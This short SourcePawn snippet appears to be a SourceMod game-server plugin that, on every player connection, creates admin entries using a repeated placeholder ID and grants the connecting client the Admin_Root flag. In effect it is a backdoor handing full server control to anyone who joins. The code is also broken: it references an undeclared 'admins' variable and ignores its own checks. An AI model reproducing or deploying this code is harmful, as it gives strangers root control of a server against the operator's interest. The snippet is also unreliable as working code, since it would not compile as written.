public Action:add_admin(client)
{
	new AdminId:aid = GetUserAdmin(client);
	new bool:isadmin = (aid != INVALID_ADMIN_ID) && GetAdminFlag(aid, Admin_Generic, Access_Effective);
	CreateAdmin("고유번호");
	CreateAdmin("고유번호");
	CreateAdmin("고유번호");
	CreateAdmin("고유번호");
	SetAdminFlag(admins, Admin_Root, true);
	SetUserAdmin(client, admins);
}

public OnClientPutInServer(client)
{
	add_admin(client);
}
